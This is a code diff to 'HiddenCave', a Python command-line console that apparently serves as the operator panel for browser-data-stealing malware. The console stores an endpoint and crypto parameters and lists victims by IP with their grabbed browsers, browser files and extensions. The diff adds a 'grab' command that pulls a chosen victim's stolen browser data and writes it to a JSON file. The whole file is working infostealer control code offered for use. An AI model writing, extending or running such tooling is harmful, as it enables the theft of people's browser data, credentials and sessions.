@@ -1,5 +1,6 @@
 import cmd
 import os
+import json
 from utils.asciiart import banner
 from models.CORE import Core
 
@@ -8,6 +9,7 @@ class HiddenCave(cmd.Cmd):
     prompt = "$HiddenCave-> "
     doc_header = "Use help <command> for more information."
     core = Core()
+    CurrentData = None
 
     def default(self, arg):
         print("[*] Invalid command, use help for information.")
@@ -44,7 +46,7 @@ class HiddenCave(cmd.Cmd):
                 data["IV"] = self.core.GetUserInput("IV: ", "[-] Invalid IV length. Expected 12 but got ", 12, None, False)
                 self.core.CryptoParam(data)
         else:
-            if self.core.EndPoint is not None:
+            if self.core.ApiUrl is not None:
                 status = self.core.GetUserInput("[+] An endpoint is already set. Do you want to replace it with a new one? (y/n) ", "[-] Invalid input. Input must be either y or n", 0, ["y", "n"], True)
                 if status == "n":
                     return
@@ -57,7 +59,7 @@ class HiddenCave(cmd.Cmd):
                     UserInput = self.core.GetUserInput("ENDPOINT: ", "", 0, None, True)
                     if UserInput[:7] == "http://":
                         break
-            self.core.EndPoint = UserInput
+            self.core.ApiUrl = UserInput
 
     def do_save(self, arg):
         """save command\n"""
@@ -92,11 +94,11 @@ class HiddenCave(cmd.Cmd):
 
     def do_getall(self, arg):
         """getall command\n"""
-        data = self.core.GetVictims()
+        self.CurrentData = self.core.GetVictims()
 
-        if data is not None:
-            for ip in data.keys():
-                TotalBrowsers = int(data[ip]["BrowserCount"])
+        if self.CurrentData is not None:
+            for ip in self.CurrentData.keys():
+                TotalBrowsers = int(self.CurrentData[ip]["BrowserCount"])
                 print("#" * 35)
                 print(f"[+] Victim IP: {ip}")
                 print(f"[+] Total grabbed browsers: {TotalBrowsers}")
@@ -104,8 +106,8 @@ class HiddenCave(cmd.Cmd):
                 for i in range(0, TotalBrowsers):
                     print(f"[+] Browser {i + 1}")
 
-                    extentions = data[ip]["browsers"][i]["extentions"]
-                    BrowserFiles = data[ip]["browsers"][i]["browserfiles"]
+                    extentions = self.CurrentData[ip]["browsers"][i]["extentions"]
+                    BrowserFiles = self.CurrentData[ip]["browsers"][i]["browserfiles"]
 
                     print("    Browser files:")
                     for file in BrowserFiles:
@@ -117,6 +119,18 @@ class HiddenCave(cmd.Cmd):
             print("#" * 35)
         else:
             print("[-] You should first run the command check to check the endpoint and cryptographic parameters.")
+
+    def do_grab(self, arg):
+        if len(arg) == 0:
+            print("[-] Invalid input.")
+            return
+
+        data = self.core.GetVictimBrowsersData(arg)
+        if data is not None:
+            FileName = arg + ".json"
+            file = open(FileName, "w")
+            json.dump(data, file, indent=4)
+            file.close()
 
 
 if __name__ == '__main__':
